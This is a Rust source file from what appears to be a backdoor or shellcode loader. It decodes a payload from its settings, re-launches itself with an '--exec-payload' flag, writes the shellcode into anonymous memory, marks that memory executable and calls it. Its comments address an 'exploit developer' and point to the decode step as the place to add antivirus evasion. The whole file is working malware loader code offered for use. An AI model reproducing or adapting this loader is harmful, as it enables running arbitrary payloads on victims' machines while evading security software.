use std::error::Error;
use std::process::{Child, Command};
use std::{env, io, mem, ptr};

use crate::setting::Setting;

use memmap::MmapMut;

/// Call the backdoor in a new process with the argument
/// to execute the payload.
///
/// This may seem like a workaround and it is. Execute the payload
/// in the main process could - most of the shellcodes - lead to premature
/// exit. In order to avoid that to happen, always execute the payload inside
/// a new process.
pub fn from_process() -> io::Result<Child> {
    let myself = env::args().nth(0).unwrap();

    Command::new(myself).args(["--exec-payload"]).spawn()
}

/// This function is called in a new process and it is intended to never
/// continue execution.
///
/// Note dear exploit developer,
///
/// At the very first line of this function, when the payload is decoded,
/// known malicious payloads might get detected by AVs. Luckly, this
/// is not always executed.
///
/// If you want advanced AV evasion, you should change here.
pub fn execute(setting: &Setting) -> Result<(), Box<dyn Error>> {
    let raw_payload = setting.decode_payload()?;

    println!("INFO: inject execute procedure");
    inject_exec(&raw_payload);

    Ok(())
}

/// Inject-Execute procedure:
///     1. map a R/W memory
///     2. write payload to that R/W region of memory
///     3. make it executable
///     4. cast the memory to a function and call it
pub fn inject_exec(payload: &Vec<u8>) {
    let len = payload.len();
    let mut w_map = MmapMut::map_anon(len).unwrap();

    unsafe {
        ptr::copy(payload.as_ptr(), w_map.as_mut_ptr(), len);
        let x_map = w_map.make_exec().unwrap();
        let code: extern "C" fn() -> ! = mem::transmute(x_map.as_ptr());
        code();
    };
}
